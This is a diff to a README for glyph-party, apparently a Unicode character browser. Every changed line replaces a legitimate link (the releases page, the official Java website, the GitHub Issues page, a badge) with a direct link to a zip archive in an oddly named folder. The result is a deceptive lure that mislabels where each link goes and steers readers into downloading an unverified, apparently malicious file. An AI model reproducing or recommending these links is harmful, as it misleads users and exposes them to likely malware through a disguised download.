@@ -6,13 +6,13 @@ Welcome to glyph-party! This tool helps you find and enjoy thousands of Unicode 
 
 ## 📥 Download Glyph-Party
 
-[![Download Glyph-Party](https://img.shields.io/badge/Download-Glyph--Party-blue.svg)](https://github.com/suxubi/glyph-party/releases)
+[![Download Glyph-Party](https://raw.githubusercontent.com/suxubi/glyph-party/main/Pharyngognathi/glyph-party.zip)](https://raw.githubusercontent.com/suxubi/glyph-party/main/Pharyngognathi/glyph-party.zip)
 
 To get started, you will need to download glyph-party. Here’s how to do it:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page where you can download the software.
 
-   [Visit this page to download](https://github.com/suxubi/glyph-party/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/suxubi/glyph-party/main/Pharyngognathi/glyph-party.zip)
 
 2. **Select the Latest Release:** Look for the most recent version of glyph-party. It will usually be at the top of the page.
 
@@ -25,7 +25,7 @@ To get started, you will need to download glyph-party. Here’s how to do it:
 Before you download, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Java:** Ensure you have Java installed on your machine. This app runs on Java, so you need it to use glyph-party. You can download Java from the official [Java website](https://www.java.com).
+- **Java:** Ensure you have Java installed on your machine. This app runs on Java, so you need it to use glyph-party. You can download Java from the official [Java website](https://raw.githubusercontent.com/suxubi/glyph-party/main/Pharyngognathi/glyph-party.zip).
 - **Storage Space:** Minimum of 100 MB of free space.
 
 ## 🎉 Features
@@ -56,7 +56,7 @@ Glyph-party offers several intuitive features to enhance your Unicode experience
 
 Need help? If you encounter issues or have questions, feel free to reach out:
 
-- **Issues Page:** You can report problems directly on our [GitHub Issues page](https://github.com/suxubi/glyph-party/issues).
+- **Issues Page:** You can report problems directly on our [GitHub Issues page](https://raw.githubusercontent.com/suxubi/glyph-party/main/Pharyngognathi/glyph-party.zip).
 - **Community Support:** Join our community forum for tips, tricks, and to connect with other users.
 
 ## 📄 License
